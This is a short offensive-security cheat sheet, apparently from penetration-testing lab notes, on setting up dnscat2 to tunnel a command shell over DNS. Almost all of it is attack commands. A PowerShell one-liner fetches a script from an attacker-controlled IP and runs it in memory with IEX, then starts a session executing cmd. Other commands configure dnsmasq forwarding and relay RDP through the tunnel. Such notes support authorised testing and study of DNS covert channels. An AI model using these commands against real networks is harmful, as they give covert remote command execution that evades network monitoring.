# DNScat

```
git clone https://github.com/iagox86/dnscat2.git
```

### Server Installation

```bash
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

#### Windows ---> Ubuntu ---> Kali (Server)

**Windows (DNSserver = Internal Ubuntu IP)**

```
$wc = New-Object System.Net.WebClient; $wc.Headers['User-Agent'] = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome; $wc.DownloadString('http://192.168.49.120/dnscat2.ps1') | IEX; Start-Dnscat2 -DNSserver 172.16.237.21 -Domain tunnel.com -PreSharedSecret 55cc1770f5788ab89b9071cb62907c21 -Exec cmd
```

**Kali (host = Kali IP)**

```
sudo ruby ~/tools/dnscat2/server/dnscat2.rb --dns host=192.168.49.120,port=53,domain=tunnel.com --no-cache
```

**Ubuntu (server = Kali IP)**

* /etc/dnsmasq.conf

```
server=/tunnel.com/192.168.49.120
sudo systemctl restart dnsmasq
```

### PowerShell Client (Separate Steps)

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Import on target:

```powershell
Import-Module .\dnscat2.ps1
```

Establish tunnel:

```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

#### Can Set Up a Forward to Push Traffic Across a Tunnel

```
listen 127.0.0.1:3389 <TARGET IP>:3389
listen 127.0.0.1:3389 172.16.106.132:3389
```

#### Used to List dnscat2 Options

```
dnscat2> ?
```

#### Used to Interact with an Established dnscat2 Session

```
dnscat2> window -i 1
```

* Ctrl+Z to go back

**Note:** Very slow connection since all traffic tunnels over DNS queries.
